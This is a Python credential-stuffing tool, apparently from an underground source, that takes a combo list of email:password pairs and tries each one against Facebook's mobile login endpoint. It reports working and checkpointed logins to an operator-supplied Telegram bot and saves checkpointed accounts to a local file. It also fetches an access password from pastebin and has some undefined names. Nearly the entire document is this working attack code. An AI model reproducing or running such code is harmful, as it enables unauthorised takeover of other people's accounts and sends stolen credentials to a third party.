try:
	import os,requests,sys
	from time import sleep 
except ImportError as e:
	sys.exit('[Error] ' + e + ' :-\\')
os.system('rm -rf .txt')

A = "\033[1;91m"
B = "\033[1;90m"
C = "\033[1;97m"
E = "\033[1;92m"
H = "\033[1;93m"
K = "\033[1;94m"
L = "\033[1;95m"

hunter = pyfiglet.figlet_format("HAMA GYAN")


def Top(s):
	for ASU in s + '\n':
		sys.stdout.write(ASU)
		sys.stdout.flush()
		sleep(50. / 700)
		
re = requests.get("https://pastebin.com/raw/EW2JedW4")
print (KAKAWI)
print ("\033[1;97mFIRST STEP OF LOGIN")
print ("\033[1;97m--------------------")
print ("\033[1;97m " )
password = "BBB"
print (E)
if password == "" :
  sys.exit()
if password in str(re.text):
  Top(H+" FIRST STEP Is Done. Logged in Successfully as ")
  print ("\033[1;93m ")
  Top("\033[1;93mPlease Wait 5 Minutes, All Packages Are Checking.....")
else:
  print (" Wrong Password !")
  os.system('xdg-open https://t.me/D_A_R_K_00')
  sys.exit()
os.system('clear')
r = requests.session()
print (Tik)
print (A+"["+C+"1"+A+"]"+H+"  STERT HACK ")
print (A+"["+C+"0"+A+"]"+L+"  EXIT ")
print (A)
TOOLS = input(K+' Choose the country : '+C)

if (TOOLS == '1'):
	os.system('clear')
	print(Tik)
	token = input(A+"["+C+"√"+A+"]"+H+ " TOKN BOT TELEGRAM >>>\n"+C)
	ID = input(A+"["+C+"*"+A+"]"+H+ " ID TELEGRAM >>>\n"+C)
	file = input(A+"["+C+"√"+A+"]"+H+ " Bnwsa combo.txt >>>"+C)
	print(E)
	print("-"*50)
	Kakawi = open(file, 'r')
	
	
	
	
	while True:
		user = Kakawi.readline().split('\n')[0]
		eml = user.split(':')[0]
		pw = user.split(':')[1]
		link = 'https://mobile.facebook.com/login.php'
		data = {
    'email': eml,
    'pass': pw
    }
		headers = {
'User-Agent' : 'Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B',
'Accept-Language' : 'en-US,en;q=0.5'
}
		shot = requests.post(link, headers=headers, data=data).text
		if "xc_message" in shot:
			print('\033[1;91m [\033[1;92mHACK - OK\033[1;91m] \033[1;92m%s \033[1;93m-> \033[1;92m %s '%(str(eml), str(pw)))
			r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= GOOD >>  Facebook  <<  ✅\n ===============. \n\n𝐄𝗆𝖺𝗂𝗅 →  {eml}\n\n𝐏𝐀𝐒𝐒 → {pw}\n\n. ==============DARK\n•  .")
		elif "checkpointSubmitButton-actual-button" in shot:
			print('\033[1;91m [\033[1;90m10 DAYS - CP\033[1;91m] \033[1;97m%s \033[1;93m-> \033[1;97m %s '%(str(eml), str(pw)))
			r.post(f"https://api.telegram.org/bot{token}/sendMessage?chat_id={ID}&text= BAND\n ================. \n\n𝐄𝗆𝖺𝗂𝗅 → : {eml}\n\n𝐏𝐀𝐒𝐒 → {pw}\n\n.=================DARK\n• .")
			with open("Cp.txt",'a') as ff:
				ff.write("Email : "+eml+"\nPass : "+pw+"\n\n")     
				
			
		else:
			print(C+"Email > "+ eml + E +" | "+C+" pass > "+ pw)
			
		